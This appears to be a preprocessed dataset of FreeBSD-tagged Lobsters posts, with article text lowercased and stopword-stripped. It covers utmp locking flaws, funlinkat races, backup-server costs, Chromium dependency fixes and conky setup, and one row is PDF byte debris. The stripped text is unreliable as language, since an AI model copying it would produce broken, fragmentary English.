chain issue freebsd starting improvement bug fix freebsd readelf elf tool chain project bora developed tool modify feature control bit elf binary example allowing binary incompatible aslr request optout part readelf work bora also added support report status feature control bit bora continued investigating security topic looking applying capsicum sandboxing kristaps bsd licensed rsync implementation openrsync work required first implementing fileargslstat support capfileargs committed well change ft directory hierarchy routine yet committed freebsd rest work term bora investigate test unmodified linux docker container freebsd evaluate state linuxulator support project sponsored freebsd foundation next part nontext attachment scrubbed name signatureasc type applicationpgpsignature size byte desc available url http information freebsdstable mailing list
243,Lobsters,freebsd,FreeBSD,Bad utmp implementations in Glibc and FreeBSD,https://davmac.wordpress.com/2019/05/04/bad-utmp-implementations-in-glibc-and-freebsd/,bad utmp implementation glibc freebsd,bug filed bug filed implement utmp function like,recently released another version dinit service manager init system number minor improvement including build system running make gmake enough system predefined configuration need edit mconfig hand main feature release readiness notification support updating utmp database point expect might one two reader wondering utmp database might linux find easily enough via man utmp terminal utmp file allows one discover information currently using system may user currently using system program use utmp logging openbsd man page clarifies utmp file used program user w word utmp record currently logged system another file wtmp record logins logouts well potentially certain system event reboots time update hint main motivation utmp support dinit wanted command correctly report current logins wanted boot time correctly recorded wtmp file however began implement support utmp wtmp dinit also started think database worked knew already simply flat file database ie record fixed number byte size struct utmp structure file normally readable unprivileged user utility need setuidsetgid updating reading database done behind scene via normal file system read writes via getutent pututline family function getutxentpututxline posix equivalent higherlevel login logout function found libutil openbsd latter available lowerlevel routine exist wondered file consist fixedsized record readable regular user consistency maintained process ensure update database conflict another process also attempting update database time similarly process reading entry database sure receives consistent full record record partially updated posix allows write call return without written requested byte aware linux bsds documenting happen regular file clearly kind locking needed process want write read database lock first performs operation unlocks database happens hood implementation getutentpututline function equivalent wondered user process able lock utmp file prevents update stop user process manually acquiring holding lock long even practically infinite duration would prevent database updated would perhaps even prevent loginslogouts completing unfortunately answer nothing yes possible different system prevent database correctly updated even prevent user including root logging system specifically linux glibc suppose system glibc update database prevented completely logins delayed second bug filed freebsd update database prevented logins prevented indefinitely bug filed note freebsd file named utxactive otherwise utmp system patch quickly put together filed bug progress seemingly stalled checked system suspect various bsds could susceptible related problem hand system immune linux musl musl implement utmp function though noop stub understand musl faq claim need setuid program update database seems perfectly reasonable simply limit modification daemon already running root particular group perhaps referring terminal emulator create utmp entry linux utmp manpage suggests something happens though also seems unnecessary openbsd structure utmp file one particular entry per tty device avoids need locking writes tty entry naturally serialised since either login logout performs locking reading leaf open possibility reading partially written entry though certainly le severe problem one affecting glibcfreebsd whole thing issue singleuser system multipleuser system concern system recommend making varrunutmp varrunwtmp equivalent readable owner group removing altogether forgoing ability unprivileged user run command otherwise risk user able deny logins prevent recorded per fix still allow unprivileged process read database come conclusion best option use locking separate rootonly file write operation live limitation theoretically possible program read partiallyupdated entry seems unlikely ever happen let alone actually cause significant problem practice completely solve problem either need atomic read write support file secondary mechanism accessing database obviated concurrency problem eg access database via communication running daemon serialize request perhaps musl taking right approach simply excluding functionality like like loading related
244,Lobsters,freebsd,FreeBSD,Two Years on Linux,https://bitcannon.net/post/two-years-on-linux/,two year linux,finding alternative mac o x previous post series embracing awesome elementary o albert enpass gnome tilix neovim log spamming memory issue note comment spectrwm comparison tiling window manager awesome awesome window manger using centerwork layout working linuxconfau badge clickfingers xprofile rclua moving freebsd desktop computer recently rebuilt personal server infrastructure docker hosted alpine linux bhyve announcement zol ported freebsd linuxconfau rust powered linuxconfau epaper badge raspbian slow networking virtualised environment electron port u bounty issue great post braindead requirement must use hack work around avoiding unnecessarily linux specific code journey continues new desktop arch install nixos guix rust redox o fuschia,sixth post series finding alternative mac o x previous post series recapped first year away mac o move freebsd desktop computer search ideal desktop continues preference evolve gain experience post summarise two year switching away mac o includes leaving freebsd desktop switching gnome awesome cover motivation benefit drawback giving complete desktop environment build desktop embracing awesome identify general trend time away mac o would one gradual migration initially looking replicate mac o experience landed elementary o shared many value mac o time moved vanilla gnome gradually dropped tool initially felt essential like albert enpass instead opted built functionality command line tool gateway tool allowed remain far outside computing comfort zone time go though adopting platform native option like using built gnome search instead dedicated app like albert gnome working pretty well even got updated freebsd although remained current version despite high resource usage conversation blog post shift workflow led reevaluate tiling window manager using terminal ever comfortable terminal long time realised using tiling feature tilix neovim lot also using tiling feature gnome show two apps sidebyside memory usage log spamming gnomeshell bothering former overflowed snarky tweet led conversation le convinced use javascript gnomeshell ultimate cause memory issue fact issue went unfixed year made evaluate option note gnome leak largely fixed good conversation friend long time linux proponent use commented felt probably like tiling window manager tried really like semimanual management layout prompt start looking around though read interesting blog post comment post really piqued curiosity mentioned spectrwm possible candidate installed really taken primarysecondary tiling model sensible default approach tweaked ran spectrwm xps eventually ran limitation configuration integrated bar point mostly enjoying tiling window manager first time spent time poring arch linux wiki comparison tiling window manager page reviewed option page looking one supported primarysecondary model spectrwm well maintained configurable came usable base configuration many dependency eventually landed awesome well established project us lua configuration simple easy learn language allows almost configuration created happily using system four month awesome window manger using centerwork layout working linuxconfau badge rose though thing switching desktop environment window manager make really realise thing get free desktop environment settling awesome needed buildfind replacement following feature took granted gnome brightness control keyboard button volume control keyboard button setting dpi correctly hidpi display display adjustment addingremoving external display automatically unlocking keyring upon login need enter password ssh gpg key displaying battery volume level top bar trackpadmouse configuration trackpad acceleration natural scrolling enable clickfingers behaviour double buffering window prevent tearing black fill shadow present notification solve challenge check xprofile rclua curious moving freebsd oct jan ran freebsd primary o desktop computer similarly hosted website others freebsd server two year recently rebuilt personal server infrastructure docker hosted alpine linux went back arch linux desktop computer one thing isolation led switch lot little thing culminated broken system one day pushed edge list issue come mind particular post would long went detail item aware solution workarounds like running linux bhyve sum whole individual item made switch zfs linux ported freebsd one reason used freebsd zfs assumption freebsd implementation stable canonical zfs linux zol however announcement zol ported freebsd get bug fix improvement wider developer base suggested wrong wantedneeded use docker portion community like point jail existed docker somehow better experience jail user experience terrible compared docker lack lot feature docker automatically take care networking file system layerscaching distribution image attending linuxconfau general fear loathing change community exhibit decry everything keep thing way violation unix philosophy though everything done unix grandfather perfect unchangeable working rust powered linuxconfau epaper badge project targeted raspbian easier test linux host advanced virtualisation built graphic support need vnc workarounds losing hour slow networking virtualised environment something work linux reaction improved freebsd code conduct last year community deeply troubled graphic support recent drmkmod work brings modern graphic support freebsd great improvement port linux code running bunch linux code anyway maybe better go source onerous process required contribute patch update port find someone review merge bug patch supplied sit unmerged month unless know right people nudge continued use tool unfamiliar vast majority developer day subversion patch based workflow deal think huge barrier entry new contributor electron port one seems able get line electron fan choice app electron app least like option run u bounty issue added apology know list bit ranty something bit le ranty read great post alexander leidinger outline thing think project need stay relevant called community behaviour reaction want point folk represent whole community lot bsd community lovely best comparatively small resource available thank effort clincher failed upgrade january think followed handbook something happened zfs pool prevented system booting able boot install flash drive mount pool fine refused boot spent several hour trying fix end final straw carefully backed everything clean arch linux zfs install knowledge zol lot mature originally thought decided install arch onto nvme drive home live zpool comprised ssds one drawback using zfs home dropbox stop working due braindead requirement must use hack work around proper dropbox support freebsd install different use dropbox maintenance mode anyway rarely actually need finally may using freebsd daytoday anymore mean completely left continue make monthly donation freebsd openbsd project continue ensure bsd system wellsupported software build also advocate avoiding unnecessarily linux specific code possible journey continues two year journey continues expect keep enjoy exploring preference shift time future expect periodically try wayland based system like new desktop arch install issue copy paste firefox alacrity led put hold operating system front nixos guix pioneering new way constructing reliable system rust developer also watching redox o o written scratch rust come google fuschia project also interesting see unfold world operating system may diverse still lot come
245,Lobsters,freebsd,FreeBSD,Introducing funlinkat,https://oshogbo.vexillium.org/blog/63/,introducing funlinkat,lcamtuf source source removing file race condition unlinking file descriptor help problem design funlinkat linux commited code freebsd help thread,operating system often longterm problem one described lcamtuf earliest mention able find article motivated work many year way remove file race free way let first look closer problemone first sycalls created unixlike system unlink freebsd syscall number source linux number dependent architecture also tenth syscall source indicated one primary syscalls unlink syscall simple provide one single path file want remove removing file removing file process interesting let spend moment understand first removing file removing link directory unixlike system many link single file hard link remove link file file system mark block used file free different file system behave differently let jump second digression process called unlinking removing file unlink file two three thing happen remove entry directory filename decrease file reference count inode link go zero file removed disk nt mean block disk filled zero though may happen depending file system configuration however case mean file system mark block free use write new data later mostly mean removing file directory operation directory file inode situation slightly different removing directory go topic today another interesting subject happens system perform first second step list depends file system also something leave another time race condition unlinking problem unlink even unlinkat function guarantee file really unlinking let look example stats file want unlink performed test time another process removed file recreated finally try remove file longer file classic race condition situation occurs almost every day example process pid file pid file file created process indicate already running process identifier process repeatedly remove pid file exiting process performing sanitary check using stat check remove right file process overwrites pid file unlinking getting information file would remove wrong pid file file descriptor help unixlike operating system get handle file called file descriptor file descriptor guarantee u operation performing done file inode even someone unlink number directory entry operating system free structure behind file descriptor detect file removed someone recreated unlinked example alternative function fstat allows u get file status given descriptor example thanks using file descriptor fd receive status file opened write file wanted performed sanitary check matter link removed recreated unfortunately unlinking still unlinked wrong file problem design already know file may many link disk point single inode happens open file simplifying kernel creates memory representation inode inode stored disk called vnode single representation used process refer inode disk process open file inode using different name example hard link file linked single vnode mean pathname stored kernel though exactly true anymore freebsd example may additional structure contain file name debugging purpose depend kernel basically reason fdunlink function instead path providing file descriptor file performed fdunlink syscall kernel know directory entry would like remove another problem architectural discussed earlier unlinking really operation directory file inode using funlink fd may create confusion removing inode corresponding file descriptor performing action directory point file funlinkat discussion decided sensible option freebsd would create funlink function syscall would performs additional sanitary check removing directory entry corresponds inode stored refers file descriptorint funlinkat int dfd const char path int fd int flag api check path opened relative dfd point vnode thanks removed race condition sanitary check performed kernel mode file system locked possibility change fd parameter may set fdnone value mean sanitary check performed funlinkat behave like unlinkat notice often refer unlink syscall end apis look like unlinkat syscall true unlink syscall old kind deprecated said referred unlink simpler day unlink simply us code unlinkat linux commited code freebsd help started thread twitter pointed similar proposal made linux year old still upstreamed lcamtuf also proposal patch never upstreamed said linux also working getting api planning reach author discus api look proposed something slightly different
246,Lobsters,freebsd,FreeBSD,FreeBSD ARM64 AMIs are now available for Amazon EC2,https://lists.freebsd.org/pipermail/freebsd-cloud/2019-April/000215.html,freebsd amis available amazon,amis cperciva tarsnapcom cperciva freebsdorg srccommitters freebsdorg svnsrcall freebsdorg svnsrchead freebsdorg http http wwwpatreoncomcperciva information freebsdcloud mailing list,amis colin percival cperciva tarsnapcom thu apr utc begin pgp signed message hash hi cloudy army people commit became possible build amis straight clean head source tree make buildworld buildkernel make c release withcloudwareyes awskeyfile awsregion awsbucket go well gjb building part weekly freebsd snapshot case anyone nt want wait built round amis hope related commits mfced time upcoming freebsd many thanks greg v heavy lifting figuring needed order get freebsd working instance colin percival forwarded message subject svn commit headrelease tool date wed apr utc colin percival cperciva freebsdorg srccommitters freebsdorg svnsrcall freebsdorg svnsrchead freebsdorg author cperciva date wed apr new revision url http log add support crossbuilding cloudware image machinearch nt match targetarch special case building image host need pull qemuuserstatic package allows u run command inside vm disk image chroot notably install package reviewed gjb mfc week sponsored patreon http wwwpatreoncomcperciva modified headreleasemakefilevm headreleasetoolsvmimagesubr begin pgp signature heca end pgp signature information freebsdcloud mailing list
247,Lobsters,freebsd,FreeBSD,Silent Fanless FreeBSD Server - Redundant Backup,https://vermaden.wordpress.com/2019/04/03/silent-fanless-freebsd-server-redundant-backup/,silent fanless freebsd server redundant backup,silent fanless freebsd desktopserver silent fanless freebsd server diy backup asrock celeron ghz cpu realan mini itx build seagate barracuda sata seagate backup plus pv pv devnull dd devnull cost price component asrock gigabyte psu silent fanless freebsd server diy backup power consumption power serve freebsd power management power cpu load io load asrock maxtor usb command etcrcdpowerd stop sysctl pv dd devnull service powerd start pv dd devnull grep varrundmesgboot grep ada varrundmesgboot cat varrundmesgboot zfs pool configuration zpool status data zfs get compressratio data zpool history self solution cost cost time cost time cloud storage price amazon drive amazon glacier storage backblaze cloud storage google one price time service price time service price time service price time service price time service price time service rclone nextcloud syncthing summary like,brought topic past form theoretical silent fanless freebsd desktopserver post handson silent fanless freebsd server diy backup article one comment latter compared nonredundant backup solution single disk redundant backup cloud today main backup system would like show redundant backup solution two disk zfs mirror along real power usage measurement time got asrock motherboard tdp includes celeron ghz cpu small shiny realan mini itx case look nice come aliexpress low price new unit along free shipping build realan case look like asrock motherboard earlier build internal seagate barracuda sata drive cost seagate backup plus disk external case usb port cost nearly half price least europepoland location took decision buy external one rip case saved simple performance benchmark disk pv pv aliased pv r b w b pv devnull c dd devnull record record byte transferred sec bytessec c per disk ripped part seagate backup plus usb case made laugh got different case color silver gray disk inside also different color green blue part number mounted realan disk holder record several realan case real shot render first front back side usb port bottom top case part generally realan look really nice little lower realan without com slotsholes back look even better wanted make sure room space hot air case space problem cost complete price top total part used price component cpumotherboard asrock miniitx ram psu pico internal psu leader electronics external supermicro sandisk fit usb drive system seagate drive one seagate drive two total system additional data drive today would probably get asrock gigabyte motherboard instead builtin dc jack slot compatible power adapter back eliminate need additional internal pico psu power supply asrock builtin dc jack gigabyte builtin dc jack gigabyte also low profile motherboard see back may good idea use one instead asrock get space motherboard psu earlier silent fanless freebsd server diy backup article used small compact cheap external psu instead large psu fsp group low power motherboard need lot power new leader electronics psu label internal power supply pico psu top power power consumption also measured power consumption power meter whole box two seagate barracuda drive data zfs mirror sandisk usb system drive used idle state used needed setting earlier power serve freebsd power management article cpu speed limited powerd setting etcrcconf file powerdflags n hiadaptive hiadaptive b hiadaptive used python load cpu dd load drive used dd zfs pool disk thread read write fromto disk temporary disabled compression write test echo python dd devnull dd datafile devzero power cpu load io load w idle idle w idle disk read thread w idle disk read thread disk write thread w idle disk read thread disk write thread w cpu thread idle w cpu thread disk read thread w cpu thread disk read thread disk write thread w cpu thread disk read thread disk write thread much remembering tdp power motherboard asrock single maxtor usb drive used cpu io loaded loaded system redundancy two disk command crypto freebsd kernel module able squeeze random data devrandom cpu built hardware aesni acceleration note linux user devrandom devurandom thing freebsd used dd pv command simple test made two test powerd enabled disabled check difference cpu speed turbo mode full speed turbo enabled note instead cpu frequency etcrcdpowerd stop stopping powerd waiting pid sysctl pv pv aliased pv r b w b dd devnull record record byte transferred sec bytessec c cpu limited powerd daemon able squeeze service powerd start starting powerd pv pv aliased pv r b w b dd devnull record record byte transferred sec bytessec c show data dmesg used usb drive dmesg information sandisk fit usb drive grep varrundmesgboot bus target lun removable direct access scsi device serial number transfer byte sector two seagate barracuda drive grep ada varrundmesgboot bus target lun ata sata device serial number transfer sata pio command queueing enabled byte sector bus target lun ata sata device serial number transfer sata pio command queueing enabled byte sector whole varrundmesgboot content without disk shown cat varrundmesgboot copyright c freebsd project copyright c regent university california right reserved freebsd registered trademark freebsd foundation freebsd tue dec utc root usrobjusrsrcsysgeneric freebsd clang version based llvm vt vga resolution cpu intel r celeron r cpu cpu origin genuineintel amd amd structured extended xsave vtx pat hlt mtf pause ept ug vpid vid postintr tsc pstate invariant performance statistic real memory mb avail memory mb event timer lapic quality acpi apic table warning data cache cover le apic id core freebsdsmp multiprocessor system detected cpu freebsdsmp package x core irqs motherboard smp ap cpu launched timecounter tsc frequency hz quality random entropy device external interface netmap loaded module moduleregisterinit modload vesa error random registering fast source intel secure key rng random fast provider intel secure key rng motherboard motherboard motherboard unknown io range supported port irq timecounter frequency hz quality event timer frequency hz quality port warning could nt map io registered timeofday clock resolution event timer rtc frequency hz quality iomem irq timecounter hpet frequency hz quality event timer hpet frequency hz quality event timer frequency hz quality event timer frequency hz quality event timer frequency hz quality event timer frequency hz quality event timer frequency hz quality event timer frequency hz quality timecounter acpifast frequency hz quality port port port mem irq device boot video device mem irq device device driver attached port mem irq device ahci port port multiplier supported channel channel irq device irq device port mem irq device using msix message chip rev mac rev phy none auto autoflow using default tso ethernet address netmap queuesslots tx rx mem irq device byte context size dma super speed usb device port irq giantlocked reserve io port range zfs filesystem version zfs storage pool version feature support timecounters tick every msec cad nid nid nid nid cad nid nid port removable self powered port removable self powered trying mount root zfs zrootrootdefault random unblocking device link state changed zfs pool configuration get higher compression ratio use larger blocksize zfs mirror pool zfs pool status zpool status data pool data state online scan scrub repaired error mon feb config name state read write cksum data online online online online error known data error get compression zfs pool filled lot movie photo compression ratio may great give lot space example data free space zfs get compressratio data name property value source data compressratio zfs pool configuration zpool history history data zpool create data mirror zfs set mountpointnone data zfs set data zfs set atimeoff data zfs set primarycachemetadata data zfs set secondarycachemetadata data zfs set redundantmetadatamost data zfs set data need redundantmetadata already two disk useful single disk configuration self solution cost earlier post calculate much energy server would consume currently power cost europepoland rounded mean running computer power usage hour would cost electricity bill system us idle single disk read occurs time server idle assume average pricing purpose would cost u device running hour also find calculation day multiplier year another multiplier year another multiplier cost time hour day year year year combining server cost get tco self hosted storage service cost time year year year total year tco year running system nonstop also implement feature like wake lan limit power usage even cloud storage price time searching cheapest cloud based storage found service amazon drive amazon glacier storage backblaze cloud storage google one cost summarized year period data price time service year amazon drive year google one year amazon glacier storage year backblaze cloud storage backblaze cloud storage assumed average uploaddownload price upload two time cheaper download cost summarized year period data price time service year amazon drive year google one year amazon glacier storage year backblaze cloud storage cost summarized year period data price time service year amazon drive year google one year amazon glacier storage year backblaze cloud storage let compare cost server various cloud service would run server year price similar price time service year self build na year amazon drive year google one year amazon glacier storage year backblaze cloud storage get interesting compare year cost two time cheaper self host server use cloud service one may argue cloud located many place even would buy two box put one example friend place jamaica part world price time service year self build na year self build na assuming one drive failed year amazon drive year google one year amazon glacier storage year backblaze cloud storage year using cloud service instead self hosted na solution time expensive cheapest cloud service able find even want know much would co dropbox example price time service year self build na year self build na assuming one drive failed year amazon drive year google one year amazon glacier storage year backblaze cloud storage anywhere access argument cloud service get external ip address na use dynamic dns free may also wonder compare full featured na storage well rclone rsync cloud storage able synchronize file almost anything mention much privacy keeping data priceless also setup lot service hardware like freenas bhyvejails virtualization nextcloud instance syncthing cloud storage storage cloud summary sure else could include article idea else could cover let know eof like like loading related
248,Lobsters,freebsd,FreeBSD,hikari window manager,https://hub.darcs.net/raichoo/hikari,hikari window manager,hikari wayland compositor description setting wayland freebsd mouse configuration setting xdgruntimedir setting pam setting keyboard layout building dependency compiling installing building freebsd building linux building feature enabled building xwayland support building screencopy support building gammacontrol support building layershell support building virtual input support building manpage installing without suid geekfeminism code conduct contributing,hikari wayland compositor screenshot description hikari stacking wayland compositor additional tiling capability heavily inspired calm window manager cwm core concept view group sheet workspace workspace set view currently visible sheet collection view view member single sheet switching sheet replace current content workspace view member selected sheet hikari general purpose sheet correspond number special purpose sheet view member sheet always visible stacked view selected sheet group bit fine grained sheet like sheet group collection view unlike sheet arbitrary number group group arbitrary name view one group spread among available sheet operation act entire group rather individual view setting wayland freebsd wayland currently requires care work properly freebsd section aim document recent state enable wayland freebsd stable branch change support improved mouse configuration make mouse work kernevdevrcptmask set depending version freebsd done automatically via setting value etcsysctlconf system might require moused mouse work enable service moused enable requires setting kernevdevrcptmask setting xdgruntimedir section describes use tmp xdgruntimedir wayland client eg native wayland firefox require posixfallocate work directory supported zfs therefore prevent zfs tmp dataset mounting tmp mount tmpfs tmpfs tmp persist setting edit etcfstab appropriately automatically mount tmpfs boot additionally set xdgruntimedir tmp environment setting pam setting pam needed give hikari ability unlock screen using screen locker copy appropriate hikariunlocker file pamd folder usrlocaletcpamd etcpamd linux system setting keyboard layout hikari get keyboard setting xkb environment variable select layout set xkbdefaultlayout desired value staring hikari xkbdefaultlayout de nodeadkeys de building hikari currently work freebsd linux likely change future system adopt wayland building directly repository breaking change might encountered documented updating file consulted updating newer build dependency wlroots pango cairo libinput xkbcommon pixman libucl evdevproto epollshim freebsd xwayland optional runtime dependency compiling installing build process produce two binary hikari hikariunlocker latter one used check credential unlocking screen need installed root setuid path hikari configured via xdgconfighomehikarihikariconf default configuration found prefixetchikarihikariconf depending value prefix specified installation default configuration expects default terminal emulator specified terminal environment variable installation destination configured setting prefix default usrlocal need given explicitly want install hikari directory usrlocal always state prefix issuing make since information also used specify hikari find default configuration system needed compilation process override installation path etc specify etcprefix building freebsd simply run make installation destination configured setting prefix default usrlocal need given explicitly make uninstall requires value prefix building linux linux bmake required need run like bmake withposixcsourceyes installation destination configured settingprefix default usrlocal need given explicitly bmake prefixusrlocal install uninstall requires value prefix building feature enabled following section explain enabled feature individual basis however enable every feature build system offer withall flag make withallyes building xwayland support hikari offer optional xwayland support enabled via setting withxwayland make withxwaylandyes building screencopy support screencopy support allows tool like grim work hikari also allows application copy desktop content disabled default added setting withscreencopy make withscreencopyyes building gammacontrol support gamma control needed tool like redshift disabled default enabled via setting withgammacontrol make withgammacontrolyes building layershell support application used build desktop component require layershell example waybar wofi slurp turn layershell support compile withlayershell option make withlayershellyes building virtual input support virtual input support needed application like wayvnc make withvirtualinputyes building manpage building hikari manpage requires pandoc build manpage run make doc version version number spliced manpage distribution tarball hikari come precompiled manpage removing need pandoc installation installing without suid hikari requires root privilege startup bsd system initialize wlroots backend dropped soon possible nt happen need prevent installation setting bit issuing withoutsuid suid still set hikariunlocker allow communication pam required password authentication make withoutsuidyes install hikari community gear inclusive welcoming everyone chose adhere geekfeminism code conduct care part community please join matrix chat hikari acmelabsspace andor subscribe mailing list sending mail hikarisubscribe acmelabsspace contributing please make sure use clangformat accompanying clangformat configuration submitting patch
250,Lobsters,freebsd,FreeBSD,AsiaBSDCon 2019 Proceedings,https://2019.asiabsdcon.org/proc-body-2019.pdf,asiabsdcon proceeding,,obj endobj xref n n n n n trailer prev startxref eof obj stream aydaei ȭ vb hsϡ x xx ʚ w
251,Lobsters,freebsd,FreeBSD,Fix Broken Dependency on FreeBSD,https://vermaden.wordpress.com/2019/03/21/fix-broken-dependency-on-freebsd/,fix broken dependency freebsd,pkg info wc l chrome reckless symlink pkgrecompilesh chrome ldd usrlocalbinchrome cat usrlocalbinchrome ldd usrlocalsharechromiumchrome ldd usrlocalsharechromiumchrome grep found cd usrlocallib l l pwd ln l l ldd usrlocalsharechromiumchrome grep found chrome using file libmapconf cat etclibmapconf cat etclibmapconf fixing broken dependency database le known pkg feature portmaster checkdepends n pkg info grep libxul pkg info qoa grep libxul pkg shell use package cat pkg info l grep bin pkglibchk use provides database le known pkg feature update rework entire article like,dunno update package often lot actually pkg info wc l much mostly dependency software use example need openbox use need dependency library protocol ok work sometimes upgrade one two application forbid start missing dependency would sa happens one twenty thirty update rare even happens easy solve also happened linux system many time freebsd related open source desktoplaptop market work today victim chromium generally use firefox sometimes page behaves strangely firefox verify behavior chromium also use chromium file opener file browser say htm html chm local file time forbid start went command line check went wrong chrome shared object found required missing dependency form library reckless symlink method considered dangerous quick dirty way fixing problem also introduce problem still many case temporary solves problem exactly quick fix till ffmpeg package finish rebuild take longer pkg upgrade command need chromium later ffmpeg package rebuilt problem caused lack gut freebsd project provide lame package openbsd guy problem freebsd guy support ffmpeg need first manually build lame package select option ffmpeg built package everytime run pkg upgrade command pita say least use pkgrecompilesh script purpose hand everytime update package two time week workflow call like pkg upgrade pkgrecompilesh build let verify something else missing chromium chrome usrlocalbinchrome ldd usrlocalbinchrome ldd usrlocalbinchrome dynamic executable usrlocalbinchrome wrapper let see contains cat usrlocalbinchrome binsh sysctlkernipcshmallowremoved sbinsysctl n sysctl cat eomsg correct operation shared memory support enabled chromium performing following command root sysctl preserve setting across reboots append following etcsysctlconf eomsg exit fi ulimit c exec usrlocalsharechromiumchrome binary actually usrlocalsharechromiumchrome file let check ldd ldd usrlocalsharechromiumchrome usrlocalsharechromiumchrome found lot deps let cut point grep shown ldd usrlocalsharechromiumchrome grep found found one dependency missing let fix cd usrlocallib l l lrwxrxrx root wheel rwxrxrx root wheel little newer version available link missing name pwd usrlocallib ln l l lrwxrxrx root wheel lrwxrxrx root wheel rwxrxrx root wheel chromium happy ldd usrlocalsharechromiumchrome grep found zero found result let start chromium chrome command chrome start usual everything work whole process visualized simple screenshots using etclibmapconf file instead making ad symlink work globally create proper libmapconf file configuration usrlocalsharechromiumchrome binary fix chromium browser cat etclibmapconf usrlocalsharechromiumchrome equivalent solution work globally symlink would follows cat etclibmapconf also easier migrate mass populate change instead copying symlink fixing broken dependency pkg database already wrote le known pkg feature article worth mentioning completeness option time one missing dependency vulnerable package started torture time even desperate compile everything portmaster already started portmaster checkdepends command said n asked fix downgrade lot package needlessly portmaster checkdepends checking dependency evince graphicsevince missing dependency missing package dependency detected found issue total package database following package installed downgrading perl downgrading glib downgrading giofambackend downgrading libffi downgrading gobjectintrospection downgrading atk downgrading downgrading pango downgrading gtkupdateiconcache downgrading dbus downgrading gtk downgrading dbusglib installing libxul installation require mb space mb downloaded try fix missing dependency yn n summary action performed dependency failed fixed still missing dependency advised try fixing manually also make sure check pkg updating known issue let see pkg show installed pkg info grep libxul mozilla runtime package used bootstrap xulxpcom apps pkg info qoa grep libxul wwwlibxul problem installed wwwlibxul instead portmaster complains pkg introduced easy grep r entire vardbpkg directory file database quite complicated package database kept sqlite database using pkg shell command connect database let check find pkg shell sqlite version enter help instruction enter sql statement terminated sqlite database seq name file main vardbpkglocalsqlite sqlite table category license pkgdirectories script deps mtree pkggroups shlibs directory option pkglicenses user file package pkgshlibs group pkgcategories pkgusers sqlite header sqlite mode column sqlite pragma tableinfo deps cid name type notnull dfltvalue pk origin text name text version text packageid integer sqlite quit know deps table probably looking pkg shell quite limited sqlite browsing use command limited mean type pkg shell select deps query first need start pkg shell type query column vardbpkglocalsqlite select deps grep libxul libxul second column name let try use header column vardbpkglocalsqlite select deps namelibxul origin name version packageid libxul problematic dependency entry nailed let modify little real installed package state vardbpkglocalsqlite update deps set originwwwlibxul namelibxul vardbpkglocalsqlite update deps set namelibxul course use official way using pkg shell command pkg shell sqlite version enter help instruction enter sql statement terminated sqlite update deps set originwwwlibxul namelibxul sqlite update deps set namelibxul sqlite header sqlite mode column sqlite select deps namelibxul origin name version packageid wwwlibxul libxul sqlite quit portmaster happy complain missing dependency portmaster checkdepends checking dependency zenity checking dependency zip checking dependency zsh viola problem solved pkg tool already called pkg set two useful option man pkgset n oldname newname changename oldname newname change package name given dependency oldname newname oldorigin neworigin changeorigin oldorigin neworigin change port origin given dependency oldorigin neworigin corresponds port directory package originated typically needed upgrading library package moved default version major port dependency change deprecated usually explained usrportsupdating also see pkgupdating example case would use pkg set wwwlibxul command sure solve problem way also updated version database use pkglibchk package also way fixcheck problem pkglibchk package keep mind two conflicting package bsdadminscripts name pkg search bsdadmin collection administration script bsd administration script install able install bsdadminscripts conflicting already installed wanted add bsdadminscripts system pkg install bsdadminscripts updating freebsd repository catalogue freebsd repository date repository date checking integrity done conflicting conflict usrlocalsbindistviper checking integrity done conflicting following package affected checked installed package removed new package installed bsdadminscripts number package removed number package installed proceed action yn n description portpackage cat collection script around use port package allows check library dependency without producing false positive pkglibchk let manage autoremove flag leaf package pkgtrim remove obsolete damaged distfiles distviper manage build flag buildflagsconf autocreate pkgplist file taking port option account makeplist www http exactly tool package pkg info l grep bin usrlocalsbindistviper usrlocalsbinmakeplist usrlocalsbinpkglibchk usrlocalsbinpkgtrim invoked without argument check package installed system pkglibchk job done order make ckecks chromium need specify chromium package pkglibchk chromium command pkglibchk allows fetch missing dependency based package provides file create list package need rebuilt use provides database also use provides database pkg command pkg provides name desc avc video encoding library repo freebsd filename learn setup provides database pkg command check le known pkg feature article please update rework entire article roman philosopher seneca said teach learn true especially article posted various place people reminded best way create symlink best way stand corrected added additional section method fixing broken dependency freebsd linuxillumos system eof like like loading related
252,Lobsters,freebsd,FreeBSD,FreeBSD Desktop - Part 18 - Global Dashboard,https://vermaden.wordpress.com/2019/03/20/freebsd-desktop-part-18-global-dashboard/,freebsd desktop part global dashboard,freebsd desktop global page part configuration pause application conky pkg install portdowngrade conky xbindkeys cd usrportssysutilsconky cat distinfo cd usrportssysutils mv conky portdowngrade sysutilsconky grep c portdowngrade sysutilsconky pwd cat cat conkydistinfo pwd cd conky pwd make package grep wrkdirprefix etcmakeconf find usrportsobj name conky txz mv root make c usrportssysutilsconky clean distclean pkg delete conky pkg add conky version xbindkeys cat xbindkeysrc freebsd desktop part key component keyboardmouse shortcut script configs grep exec b c update latest conky also work like,many time found watching various debug command like toppsmountdf various log file like varlogmessages varlogautomountlog thought something went wrong take little long needed open several terminal xterm session quite fast open win space enter still check went wrong action tired created thing called global dashboard information would ever need debugging may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content command freebsd contains chosen one mount p varlogautomountlog varlogmessages vmstat usbconfig p axwww cpu r command sockstat l top io total gstat p df g pciconf l ifconfig make sure doas installed configured basic way wheel group make work properly pkg install doas echo permit nopass wheel root usrlocaletcdoasconf chmod usrlocaletcdoasconf let show look typical empty desktop global dashboard disabled global dashboard enabled sake comfort use scroll lock key xbindkeys toggle debug session already use pause break key pause application described part configuration pause application episode freebsd desktop series conky use older version conky current one broken anything serious use portdowngrade tool job first let install needed package pkg install portdowngrade conky xbindkeys assuming date freebsd port tree usrports directory see current conky version port cd usrportssysutilsconky cat distinfo timestamp size downgrade conky port usable version portdowngrade utility already tried various conky port version one looking revision cd usrportssysutils mv conky portdowngrade sysutilsconky grep c madpilot wed sep line update conky conkyawesome take maintainership option adapted new version removed lua option since mandatoory requirement use project install target fix installation lua helper library project moved github conkyawesome properly use optionsexclude pr submitted approved ntarmos ceidupatrasgr former maintainer pawel tue jul line fix typo pawel tue jul line add explicit implies dependency simplify option handling convert useslocalbase switch option helper libdepends usexorg usegnome pr based submitted elferdo gmailcom approved maintainer timeout mat tue jul line fetch conky port revision working version portdowngrade sysutilsconky conkyfiles conkymakefile conkyfilespatchconfigure conkyfilespatchluacairopkg conkyfilespatchsrcconkyc conkyfilespatchsrcfreebsdc conkyfilespatchsrcfreebsdh conkyfilespatchsrcfsc conkypkgdescr conkydistinfo checked revision done cd conky run make deinstall install clean please note portdowngrade longer modifies port tree checked port usrportssysutilsconky done let verify version need pwd usrportssysutils cat timestamp size cat conkydistinfo size yup build conky package may handy 